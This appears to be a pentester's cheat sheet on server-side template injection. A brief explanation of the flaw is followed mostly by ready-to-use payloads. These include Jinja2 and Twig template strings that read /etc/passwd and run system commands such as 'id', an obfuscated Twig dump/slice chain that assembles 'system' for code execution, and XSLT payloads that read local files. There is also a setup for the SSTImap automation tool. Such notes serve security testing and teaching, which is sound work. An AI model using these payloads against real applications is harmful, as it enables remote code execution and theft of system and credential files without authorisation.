- Template engines can handle user input securely if it is provided as **values to the rendering function**
    -  insert the values into the corresponding places in the template and do not run any code within the values
    - If templating is implemented correctly, user input is always provided to the rendering function in values and never in the template string
- SSTI occurs when an attacker can control the template parameter, as template engines run the code provided in the template
    - SSTI can occur when user input is **inserted into the template before the rendering function is called** on the template
    - Second order SSTI occurs when a web application calls the rendering function on the same template multiple times, if user input is inserted into the output of the first rendering process, it would be considered part of the template string in the second rendering process.


# Test For SSTI

`${{<%[%'"}}%\.`

#### Identify engine
```
TRUE             ${{7*7}}                FALSE
                   |  |
                    \/
                 /      \
                /        \
               /          \
            {{7*7}}           a{*comment*}b
            /     \                /     \
           /       \              /       \
      {{7*'7'}}  not vuln      Smarty    ${"z".join("ab")}
        /   \                                 ||
       /     \                                \/
 49(Twig)  "777777"(Jinja)                    Mako
```


# Python

## Jinja2
[payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2)

#### Configuration

`{{ config.items() }}`

#### Available Built-in Functions

`{{ self.__init__.__globals__.__builtins__ }}`

#### Built-In : open()

`{{self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}`

#### Built-in : import -> RCE

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`


# PHP


## Twig

#### Information

`{{ _self }}`

#### symfony - file_excerpt filter -> LFI

`{{ "/etc/passwd"|file_excerpt(1,-1) }}`

#### filter Function -> RCE

`{{ ['id'] | filter('system') }}`



#### dump() usage


if the php server has debug enabled in the twig module and imported twig extensions like [this](https://github.com/0xM4hm0ud/MyCTFChallenges/tree/main/CyberSpace%20CTF%202024/twig-playground):

```
$twig = new \Twig\Environment($loader, [
    'debug' => true,
]);
$twig->addExtension(new \Twig\Extension\DebugExtension());
```

You can use the [dump(var)](https://twig.symfony.com/doc/3.x/functions/dump.html) twig function which dumps debug information about a variable.

```
<pre>
    {{ dump(user) }}
</pre>
```

then using the [slice(start, length)](https://twig.symfony.com/doc/3.x/filters/slice.html) twig filter you can assign characters to variables like [this](https://sec.stealthcopter.com/wpml-rce-via-twig-ssti/):

```
{% set a = dump()|slice(0,1)|lower %}
{% set d = dump()|slice(356,1)|lower %}
{% set hyphen = _charset|slice(3,1) %}
{% set slash = endl|join|nl2br|slice(4,1) %}



{% set system = s~y~s~t~e~m %}
{% set id = i~d %}
{{[id]|map(system)|join}}

{% set slash = [pwd]|map(system)|join|slice(0,1) %}
```



# Automation

## SSTImap
[SSTImap](https://github.com/vladko312/SSTImap)

```
$ git clone https://github.com/vladko312/SSTImap
$ cd SSTImap
$ pip3 install -r requirements.txt
$ python3 sstimap.py 
```

# XSL Transformation

```
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />

<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />


php functions:

<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```
